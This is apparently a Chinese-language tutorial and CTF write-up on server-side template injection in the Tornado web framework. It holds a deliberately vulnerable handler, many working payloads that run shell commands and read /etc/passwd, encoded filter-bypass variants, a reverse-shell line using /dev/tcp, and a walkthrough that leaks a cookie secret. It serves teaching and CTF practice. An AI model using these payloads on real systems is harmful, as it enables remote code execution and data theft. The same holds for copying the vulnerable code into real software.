    def login(request):
        #获取用户输入
        login_form = AccountForm.LoginForm(request.POST)
        if request.method == 'POST':
            #判断用户输入是否合法
            if login_form.is_valid():#如果用户输入是合法的
                username = request.POST.get('username')
                password = request.POST.get('password')
                if models.UserInfo.objects.get(username=username) and models.UserInfo.objects.get(username=username).password == password:
                        request.session['auth_user'] = username
                        return redirect('/index/')
                else:
                    return render(request,'account/login.html',{'model': login_form,'backend_autherror':'用户名或密码错误'})
            else:
                error_msg = login_form.errors.as_data()
                return render(request,'account/login.html',{'model': login_form,'errors':error_msg})
        # 如果登录成功，写入session，跳转index
        return render(request, 'account/login.html', {'model': login_form}
由上面可知:render是一个类似模板的东西，可以使用不同的参数来访问网页，所以render其实就是Tornado的一个工具。
## 注入攻击：
### SSTI in tornado.template:
#### 常规手法:
Tornado中SSTI 手法基本上兼容 jinja2、mako 的 SSTI 手法，思路非常灵活：
    {{ __import__("os").system("whoami") }}
    {% apply __import__("os").system %}id{% end %}
    {% raw __import__("os").system("whoami") %}
#### 攻击方式：
先来写个测试用例：
    import tornado.ioloop
    import tornado.web
    from tornado.template import Template
    class IndexHandler(tornado.web.RequestHandler):
        def get(self):
            tornado.web.RequestHandler._template_loaders = {}#清空模板引擎
            with open('index.html', 'w') as (f):
                f.write(self.get_argument('name'))
            self.render('index.html')
    app = tornado.web.Application(
        [('/', IndexHandler)],
    )
    app.listen(8888, address="127.0.0.1")
    tornado.ioloop.IOLoop.current().start()
解释一下这串代码是什么意思：
    这段代码使用 Tornado 框架创建了一个 Web 应用，监听本地地址 127.0.0.1 的端口 8888。当用户访问该应用的根路径时，会执行 IndexHandler 类的 get 方法。
    在 get 方法中，将请求参数中的 name 参数写入一个名为 index.html 的文件中，并使用 Tornado 的模板引擎将该文件渲染为 HTML 页面返回给用户。
    需要注意的是，该代码使用了一个特殊的方式来清空模板引擎的缓存，即将 _template_loaders 属性设置为空字典，这可能是为了避免在开发过程中因为模板缓存而导致修改无效的问题。
对于 Tornado 来说，一旦 `self.render` 之后，就会实例化一个
`tornado.template.Loader`，这个时候再去修改文件内容，它也不会再实例化一次。所以这里需要把
`tornado.web.RequestHandler._template_loaders` 清空。否则在利用的时候，会一直用的第一个传入的
payload。
这种写法会新引入变量：
    1. request：即 tornado.httputil.HTTPServerRequest，下面的属性都是与 http 请求相关的
    2. handler：tornado.web.RequestHandler的示例。表示当前请求的 url 是谁处理的，比如这个代码来说，handle 就是 IndexHandler。它下面有很多属性可以利用。
所以 Tornado 中，`tornado.httputil.HTTPServerRequest` 和
`tornado.web.RequestHandler` 是非常重要的类。它们拥有非常多的属性，在 SSTI
相关的知识点中，我们需要熟练掌握这些属性的作用。
#### 利用 HTTPServerRequest：
为了方便下面把 `tornado.httputil.HTTPServerRequest` 的实例称为 `request`。
注意，由于属性非常多，属性自己也还有属性。所以这部分我只列了一些我感觉会用到的属性，肯定不全，有特殊需求的话需要自行进行挖掘。
##### 绕过字符限制：
  * `request.query`：包含 get 参数
  * `request.query_arguments`：解析成字典的 get 参数，可用于传递基础类型的值（字符串、整数等）
  * `request.arguments`：包含 get、post 参数
  * `request.body`：包含 post 参数
  * `request.body_arguments`：解析成字典的 post 参数，可用于传递基础类型的值（字符串、整数等）
  * `request.cookies`：就是 cookie
  * `request.files`：上传的文件
  * `request.headers`：请求头
  * `request.full_url`：完整的 url
  * `request.uri`：包含 get 参数的 url。有趣的是，直接 `str(requests)` 然后切片，也可以获得包含 get 参数的 url。这样的话不需要 `.` 或者 `getattr` 之类的函数了。
  * `request.host`：Host 头
  * `request.host_name`：Host 头
    {{request.method}}  //返回请求方法名  GET|POST|PUT...
    {{request.query}}  //传入?a=123 则返回a=123
    {{request.arguments}}   //返回所有参数组成的字典
    {{request.cookies}}   //同{{handler.cookies}}
##### 回显结果
  * `request.connection.write`
  * `request.connection.stream.write`
  * `request.server_connection.stream.write`
例如：
    {%raw request.connection.write(("HTTP/1.1 200 OK\r\nCMD: "+__import__("os").popen("id").read()).encode()+b"hacked: ")%}'
#### 利用 Application:
主要用于攻击的有这几个属性：
    - Application.settings：web 服务的配置，可能会泄露一些敏感的配置
    - Application.add_handlers：新增一个服务处理逻辑，可用于制作内存马，后面会一起说
    - Application.wildcard_router.add_rules：新增一个 url 处理逻辑，可用于制作内存马
    - Application.add_transform：新增一个返回数据的处理逻辑，理论上可以配合响应头来搞个内存马
#### 利用 RequestHandler:
为了方便下面把 `tornado.web.RequestHandler` 称为 `handler`。需要注意的是，handler 是有 `request`
属性的，所以理论上 handler 要比 request 实用。
    {{handler.get_argument('yu')}}   //比如传入?yu=123则返回值为123
    {{handler.cookies}}  //返回cookie值
    {{handler.get_cookie("data")}}  //返回cookie中data的值
    {{handler.decode_argument('\u0066')}}  //返回f，其中\u0066为f的unicode编码
    {{handler.get_query_argument('yu')}}  //比如传入?yu=123则返回值为123
    {{handler.settings}}  //比如传入application.settings中的值
##### 绕过字符限制:
  1. `RequestHandler.request.*`：参考利用 `HTTPServerRequest` 那节
  2. 其他和 request 一样的方法：例如 `get_argument` 等等，就不一一列举了，可以参考官方文档
##### 回显结果:
    - RequestHandler.set_cookie：设置 cookie
    - RequestHandler.set_header：设置一个新的响应头
    - RequestHandler.redirect：重定向，可以通过 location 获取回显
    - RequestHandler.send_error：发送错误码和错误信息
    - RequestHandler.write_error：同上，被 `send_error` 调用
## 绕过：
### global()函数全局调用&绕过`_`:
我们可以发现在tornado中是可以直接使用global()函数的，更令我们兴奋的是竟然可以直接调用一些python的初始方法，比如 **import**
、eval、print、hex等，这下似乎我们的payload可以更加简洁了
    {{__import__("os").popen("ls").read()}}
    {{eval('__import__("os").popen("ls").read()')}}
其中第二种方法更多的是为了我们刚才讲到的目的，绕过对`_`的过滤。
    {{eval(handler.get_argument('yu'))}}
    ?yu=__import__("os").popen("ls").read()
### 绕过`.`：
因为tornado中没有过滤器，这样的话我们想要绕过对于.的过滤就有些困难了。而如果想要绕过对于引号的过滤，可以将上面的payload改成如下格式
    {{eval(handler.get_argument(request.method))}}
    然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理
### 无过滤payload ：
    1、读文件
    {% extends "/etc/passwd" %}
    {% include "/etc/passwd" %}
    2、 直接使用函数
    {{__import__("os").popen("ls").read()}}
    {{eval('__import__("os").popen("ls").read()')}}
    3、导入库
    {% import os %}{{os.popen("ls").read()}}
    4、flask中的payload大部分也通用
    {{"".__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__["popen"]('ls').read()}}
    {{"".__class__.__mro__[-1].__subclasses__()[x].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
    其中"".__class__.__mro__[-1].__subclasses__()[133]为类
    第二个中的x为有__builtins__的class
    5、利用tornado特有的对象或者方法
    {{handler.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
    {{handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['eval']("__import__('os').popen('ls').read()")}}
    6、利用tornado模板中的代码注入
    {% raw "__import__('os').popen('ls').read()"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
过滤payload：
    1.过滤一些关键字如import、os、popen等（过滤引号该方法同样适用）
    {{eval(handler.get_argument(request.method))}}
    然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理
    2.过滤了括号未过滤引号
    {% raw "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
    3.过滤括号及引号
    下面这种方法无回显，适用于反弹shell，为什么用exec不用eval呢？
    是因为eval不支持多行语句。
    __import__('os').system('bash -i >& /dev/tcp/xxx/xxx 0>&1')%0a"""%0a&data={%autoescape None%}{% raw request.body%0a    _tt_utf8=exec%}&%0a"""
    4.其他
    通过参考其他师傅的文章学到了下面的方法（两个是一起使用的）
    {{handler.application.default_router.add_rules([["123","os.po"+"pen","a","345"]])}}
    {{handler.application.default_router.named_rules['345'].target('/readflag').read()}}
## 实战：
### easy_tornado render：
题目一开始给了三个文件的链接，flag.txt中提供了flag所在的文件夹，welcome文件提供了render关键词，hints.txt提供了一个计算公式在地址栏中显示了一个filehash的值，
    md5(cookie_secret+md5(filename))
所以逻辑上应该是我们利用计算出来的文件签名的hash值，来访问flag.txt对应的提示文件，就可以得到flag
所以我们现在主要的目标就是寻找cookie密钥，然后下一步就要关注给我们的提示了：render在模板注入中Tornado框架下有一个模板渲染就是render，所以我们把目光放在Tornado上面，当我们直接访问/fllllllllag时，会出现这个msg=error这个页面。
所以我们在这里可以尝试进行模板注入：
这里`{{handler.application.settings}}`或者`{{handler.settings}}`就可获得`settings`中的
**cookie_secret** 。
    import hashlib
    def md5encode(str):
        m = hashlib.md5()
        m.update(str)
        return m.hexdigest()
    name = '/fllllllllllllag'
    secret = '9fdfa0bb-bf87-4cc8-9126-e00e9123222a'
    name = name.encode()
    bb = md5encode((secret + md5encode(name)).encode())
    print(bb)
参考文章：  
[(13条消息) tornado模板注入_tornado 模板注入_yu22x的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/123329244)  
[SecMap - SSTI（Tornado） - Tr0y's
Blog](https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/#利用-httpserverrequest)